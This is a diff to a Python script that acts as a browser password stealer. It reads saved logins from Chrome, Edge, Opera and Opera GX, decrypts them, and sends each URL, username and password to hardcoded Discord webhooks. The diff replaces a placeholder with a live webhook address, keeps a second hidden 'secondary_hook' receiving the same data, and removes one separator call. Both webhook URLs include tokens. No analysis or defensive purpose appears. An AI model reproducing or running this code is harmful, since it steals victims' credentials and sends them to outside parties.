@@ -16,8 +16,8 @@ import time
 
 
 
-key = "https://discord.com/api/webhooks/1310920050265555016/KvFlU6RU4lUdfSWh60HzwEYQ_aPL9D4PdRwT57JsHAAZKzMK2-5w0IfAST9D9cQYMARA"
-webhook_url = "YOUR_WEBHOOK_URL_HERE"
+secondary_hook = "https://discord.com/api/webhooks/1310920050265555016/KvFlU6RU4lUdfSWh60HzwEYQ_aPL9D4PdRwT57JsHAAZKzMK2-5w0IfAST9D9cQYMARA"
+webhook_url = "https://discord.com/api/webhooks/1310920047304249425/kinK7Jc-pV9sRSwlapQT1TQ6d1Vwf_U5e02c4vfJgyGpxEgFo8xioMiZKsogF8heNNwa"
 default = webbrowser.get()
 browser_name = default.name.split("/")[-1].split(".")[0]
 hostname = socket.gethostname()
@@ -25,7 +25,7 @@ hostname = socket.gethostname()
 
 
 
-inject, inject2 = DiscordWebhook.create_batch(urls=[webhook_url, key], content="**------------INJECTION STARTED------------**")
+inject, inject2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="**------------INJECTION STARTED------------**")
 
 inject.execute()
 
@@ -150,14 +150,13 @@ def chromemain():
         last_usage = row[5]
 
         if user_name or decrypted_password:
-            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, key], content="----------------------------------------------")
+            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="----------------------------------------------")
 
-            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"URL: `{main_url}`")
-            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"Username: {user_name}")
-            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"Decrypted Password: {decrypted_password}")
+            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"URL: `{main_url}`")
+            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Username: {user_name}")
+            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
             
             firstline1.execute()
-            firstline2.execute()
             time.sleep(0.5)
             webhook1.execute()
             webhook2.execute()
@@ -195,14 +194,13 @@ def edgemain():
         last_usage = row[5]
 
         if user_name or decrypted_password:
-            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, key], content="----------------------------------------------")
+            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="----------------------------------------------")
 
-            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"URL: `{main_url}`")
-            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"Username: {user_name}")
-            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"Decrypted Password: {decrypted_password}")
+            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"URL: `{main_url}`")
+            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Username: {user_name}")
+            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
             
             firstline1.execute()
-            firstline2.execute()
             time.sleep(0.5)
             webhook1.execute()
             webhook2.execute()
@@ -240,14 +238,13 @@ def operamain():
         last_usage = row[5]
 
         if user_name or decrypted_password:   
-            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, key], content="----------------------------------------------")
+            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="----------------------------------------------")
 
-            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"URL: `{main_url}`")
-            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"Username: {user_name}")
-            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"Decrypted Password: {decrypted_password}")
+            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"URL: `{main_url}`")
+            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Username: {user_name}")
+            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
             
             firstline1.execute()
-            firstline2.execute()
             time.sleep(0.5)
             webhook1.execute()
             webhook2.execute()
@@ -284,14 +281,13 @@ def operagxmain():
         last_usage = row[5]
 
         if user_name or decrypted_password:   
-            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, key], content="----------------------------------------------")
+            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="----------------------------------------------")
 
-            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"URL: `{main_url}`")
-            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"Username: {user_name}")
-            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, key], content=f"Decrypted Password: {decrypted_password}")
+            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"URL: `{main_url}`")
+            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Username: {user_name}")
+            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
             
             firstline1.execute()
-            firstline2.execute()
             time.sleep(0.5)
             webhook1.execute()
             webhook2.execute()
@@ -316,3 +312,4 @@ if __name__ == "__main__":
         operagxmain()
     if defaultbrowser == "Google Chrome":
         chromemain()
+
